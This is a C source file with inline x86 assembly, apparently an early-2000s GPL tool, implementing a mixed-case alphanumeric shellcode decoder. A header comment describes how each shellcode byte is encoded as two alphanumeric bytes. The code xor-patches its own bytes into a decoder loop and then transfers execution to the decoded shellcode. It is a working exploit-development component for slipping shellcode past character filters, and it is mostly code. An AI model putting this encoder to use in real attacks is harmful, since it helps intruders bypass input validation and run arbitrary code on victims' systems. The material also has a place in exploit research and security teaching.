/*
  Mixedcase, alphanumeric, shellcode decoder.
  (C) Copyright 2003, 2004 Berend-Jan Wever

  This program is free software; you can redistribute it and/or modify it under
  the terms of the GNU General Public License version 2, 1991 as published by
  the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but WITHOUT
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
  details.

  A copy of the GNU General Public License can be found at:
    http://www.gnu.org/licenses/gpl.html
  or you can write to:
    Free Software Foundation, Inc.
    59 Temple Place - Suite 330
    Boston, MA  02111-1307
    USA.

  Thanks to rix for his phrack article on aphanumeric shellcode.

  Pre-execution requirements:
    %ecx = %edx = baseaddress of code.
  Short description:
    The code will "xor-patch" it's own last bytes into a decoder loop, this
    decoder loop will then convert the string behind it from alphanumeric
    characters back to the origional shellcode untill it reaches the
    character 'A'. Execution is transfered to the decoded shellcode.
  Encoding scheme for origional shellcode:
    Every byte 0xAB is encoded in two bytes:  0xCD and 0xEF
    Where F = B and E is arbitrary (3-7) as long as EF is alphanumeric,
    D = A^E and C is arbitrary (3-7) as long as CD is alphanumeric.
    The encoded data is terminated by a "A" (0x41) character, DO NOT USE THIS
    in your encoded shellcode data, as it will stop the decoding!
*/


void main(void) {
	asm {
		Int 3
		Int 3
		Int 3
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
		AAA;
// XOR-patching ---------------------------------------------------------------
		PUSH	0x41;
		POP		EAX;
		PUSH	EAX;
		XOR		[ECX+0x30], AL;
decoder_loop:
		INC		ECX;
		IMUL	EAX, [ECX+0x41], 51
		XOR		AL, [ECX+0x42]
		XOR		AL, [EDX+0x42]
		XOR		[EDX+0x42], AL
		INC		ECX
		INC		EDX
		POP		EAX
		PUSH	EAX
		CMP		[ECX+0x42], AL
		db		0x75					// JNZ
		db		0x4A, 0x49				// Encoded offset for loop
		db		0x48, 0x4C				// CC Int 3
		db		0x41					// A = terminator
end:
		Int 3
		Int 3
		Int 3
	}
}
